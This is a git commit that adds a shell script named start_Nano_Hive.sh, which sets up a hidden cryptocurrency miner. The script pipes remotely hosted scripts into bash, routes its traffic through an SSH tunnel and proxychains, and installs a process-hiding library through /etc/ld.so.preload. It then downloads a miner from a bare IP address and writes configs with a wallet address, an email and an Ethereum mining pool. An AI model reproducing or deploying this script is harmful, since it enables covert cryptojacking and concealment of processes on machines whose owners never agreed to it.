1d224f5dbdc10097df3b315119d8deed61f376eb
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-03-24 21:21:59 +0200

    Create start_Nano_Hive.sh

---
+++ start_Nano_Hive.sh
@@ -0,0 +1,35 @@
+#!/bin/sh
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/setUpSSHTunnel.sh | bash
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash
+sleep .1
+proxychains curl ifconfig.me
+
+proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNan.zip
+unzip magicNan.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+wget http://148.100.79.31/nanom.zip
+unzip nanom.zip
+
+cat > config_eth.ini <<END
+[Ethash]
+wallet = 0x8CB8003E428D0Fd7693D22f576A212403728c64a
+rigName = Nano
+email = mikrotik1991@gmail.com
+pool1 = naw-eth.hiveon.net:24443
+END
+
+cat > config.ini <<END
+[Ethash]
+wallet = 0x8CB8003E428D0Fd7693D22f576A212403728c64a
+rigName = Nano
+email = mikrotik1991@gmail.com
+pool1 = naw-eth.hiveon.net:24443
+END
+
+chmod +x nanominer
+chmod +x amdmemtweak
+proxychains ./nanominer
